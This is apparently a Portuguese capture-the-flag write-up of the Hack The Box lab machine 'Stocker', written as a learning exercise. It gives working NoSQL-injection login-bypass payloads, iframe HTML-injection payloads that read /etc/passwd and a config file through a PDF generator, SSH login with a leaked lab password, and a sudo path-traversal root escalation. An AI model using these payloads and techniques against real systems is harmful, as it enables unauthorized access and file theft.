---
layout: writeup
title: Stocker
platform: htb
difficulty: easy
os: linux
---

> **Dificuldade**: Fácil (opinião: difícil)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## 1. Escaneamento

```
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.45s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4EB67963EC58BC699F15F80BBE1D91CC
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
```

## 2. Enumeração

### HTTP (80) — stocker.htb

Página estática "Coming Soon". Fuzz de subdomínios:

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u "http://stocker.htb" \
  -H "Host: FUZZ.stocker.htb" --hw 12
```

Encontrado subdomínio `dev.stocker.htb` → formulário de login.

### NoSQL Injection (Auth Bypass)

Credenciais comuns falharam. SQL bypass falhou. NoSQL bypass funcionou.

Payloads:

```bash
# URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*

# JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
```

Após alterar `Content-Type` para `application/json` e enviar payload JSON, login com sucesso → redirecionamento para `/stock`.

### XSS / Server-Side HTML Injection

No fluxo de pedido, ao gerar PDF de relatório, parâmetros do request são injetados no documento. Interceptando no Burp, é possível injetar HTML/JS:

```html
<script>document.write(document.location.href)</script>
```

Confirmando contexto de execução. Próximo: leitura de arquivos via iframe:

```html
<iframe src=/etc/passwd height=800 width=500></iframe>
```

Output revela usuário `angoose`. Tentativa de ler config do Node:

```html
<iframe src=file:///var/www/dev/index.js height=800px width=800px></iframe>
```

### Vazamento de Senha no index.js

```javascript
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

Senha: `IHeardPassphrasesArePrettySecure`

## 3. Acesso Inicial

Reuso de senha em SSH:

```bash
pwncat-cs ssh://angoose@stocker.htb
# senha: IHeardPassphrasesArePrettySecure
```

## 4. Pós-Exploração

```bash
sudo -l
```

`angoose` pode executar `/usr/bin/node /usr/local/scripts/*.js` como root.

## 5. Escalação de Privilégio

Path traversal no padrão de sudo:

```bash
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/flag.js
```

`flag.js`:

```javascript
const fs = require("fs");
fs.readFile("/root/root.txt", "utf8", (err, data) => {
  if (err) throw err;
  console.log(data);
});
```

Como o `node` roda como root e o padrão sudo permite via traversal, o script criado em `~/flag.js` é executado com privilégios root → leitura de `/root/root.txt`.

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap, wfuzz vhost discovery |
| Foothold | NoSQL injection `$ne` auth bypass |
| Vuln Crítica | HTML injection no gerador de PDF → LFI via iframe |
| Initial Access | SSH com senha vazada do `index.js` |
| PrivEsc | sudo `node` com path traversal no glob → script controlado pelo usuário roda como root |
